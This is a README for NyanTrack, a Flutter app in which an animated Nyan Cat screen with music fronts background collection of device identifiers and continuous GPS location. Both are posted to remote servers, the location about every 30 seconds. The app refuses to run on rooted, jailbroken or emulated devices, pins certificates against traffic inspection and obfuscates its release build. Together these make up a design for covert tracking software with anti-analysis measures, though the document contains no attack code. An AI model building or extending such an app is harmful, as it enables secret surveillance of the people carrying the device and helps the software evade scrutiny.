# NyanTrack

A Flutter-based mobile application featuring an animated Nyan Cat interface combined with background device telemetry and location tracking capabilities.

The application demonstrates:
* Animated asset rendering using low-level image decoding
* Audio playback integration
* Runtime permission handling
* Background foreground services
* Continuous GPS tracking
* Device information collection
* Root / jailbreak detection
* Remote JSON API communication

## Features

### 🔐 Root / Jailbreak & Environment Integrity Detection

The application performs a comprehensive security check at startup using the jailbreak_root_detection package.

Before initializing core services, the app verifies the integrity of the runtime environment. If any security issue is detected, the application will not continue execution and instead displays a dedicated security error screen.

#### Checks Performed

The following validations are executed:
* Root detection (Android)
* Jailbreak detection (iOS)
* Emulator / simulator detection
* External storage installation check (Android)

If any of these checks indicate a problem, the app:
* Stops normal initialization
* Displays a full-screen security warning
* Allows the user to exit the application

### 🎨 Animated Interface

The application includes a simple animated Nyan Cat interface with looping audio playback.
This UI serves as a lightweight front-end layer while background services handle data collection and transmission.

### 📱 Device Information Collection

On startup, the application collects device metadata using `device_info_plus`.

Depending on platform, the following data may be gathered:

#### Android

* Manufacturer
* Brand
* Model
* Device / Product name
* Hardware details
* Fingerprint
* Bootloader
* Display
* Host
* SDK version
* Android version
* Supported ABIs (32/64-bit)
* Physical device indicator
* Device ID

#### iOS

* Device name
* Model
* System name and version
* Identifier for vendor
* UTS system information
* Physical device indicator

#### Web

* Browser name
* User agent
* Platform
* Vendor
* Language

Additional metadata:

* OS name
* OS version
* Locale
* Timestamp

The collected data is serialized as JSON and sent to a remote HTTP endpoint defined in:

```
AppConstants.deviceEndpoint
```

### 📍 Background Location Tracking

The app includes a background location tracking service built with:

* `flutter_background_service`
* `geolocator`

#### Behavior

* Requests foreground and background location permissions
* Starts a foreground service (Android)
* Subscribes to a continuous position stream
* Retrieves GPS coordinates approximately every 30 seconds
* Sends location data to a remote server

Each location payload contains:
```json
{
  "latitude": <double>,
  "longitude": <double>,
  "timestamp": <epoch_ms>,
  "device_id": "<string>"
}
```

Data is transmitted to:
```
AppConstants.locationEndpoint
```

## Application Flow

1. Flutter bindings are initialized.
2. Device information is collected and sent to the server.
3. Notification and location permissions are requested.
4. If background location permission is granted:
    * A foreground service is started.
    * Location tracking begins.
5. UI loads animated frames and audio assets.
6. The home screen renders the animated interface.


## Permissions

The application requests the following permissions:
* Location (foreground)
* Location (background / always)
* Notifications
* Foreground service (Android)

These are required for continuous background tracking and service persistence.

## Network Communication

All outbound requests are sent to remote API endpoints defined in:

```
lib/app_constants.dart
```

### Security

The application enforces **SSL certificate pinning** using the `http_certificate_pinning` package.

This ensures that:
* The server certificate must match a pre-configured SHA-256 fingerprint
* Connections to servers presenting unexpected certificates are rejected
* Man-in-the-middle (MITM) attacks using custom or rogue CAs are prevented

If the certificate fingerprint does not match the pinned value, the request will fail and no data will be transmitted.

### Request Characteristics

All requests:
* Use HTTPS
* Use HTTP POST
* Send JSON-encoded payloads
* Include a timestamp field
* Require a valid pinned certificate

### Updating the Pinned Certificate

When the server certificate changes (e.g., renewal, re-issuance), the SHA-256 fingerprint must be updated in the application configuration.

You can retrieve the current certificate fingerprint using:

```bash
openssl s_client -connect <domain>:443 -servername <domain> -showcerts </dev/null 2>/dev/null \
| awk '/BEGIN CERTIFICATE/{flag=1} flag{print} /END CERTIFICATE/{exit}' \
| openssl x509 -noout -fingerprint -sha256
```

This command:
1. Connects to the remote server
2. Extracts the leaf certificate
3. Computes its SHA-256 fingerprint

The resulting fingerprint should be added to the pinning configuration in the application source code.

## Dependencies

Key packages used:
* `jailbreak_root_detection`
* `http_certificate_pinning`
* `flutter_background_service`
* `geolocator`
* `device_info_plus`
* `permission_handler`
* `just_audio`

## Building the Application

To build the Android APK:
```bash
flutter clean
flutter pub get
flutter build apk
```

To build a release APK with Dart code obfuscation:
```bash
flutter build apk --release --obfuscate --split-debug-info=debug-info
```

Output location:
```
build/app/outputs/flutter-apk/
```
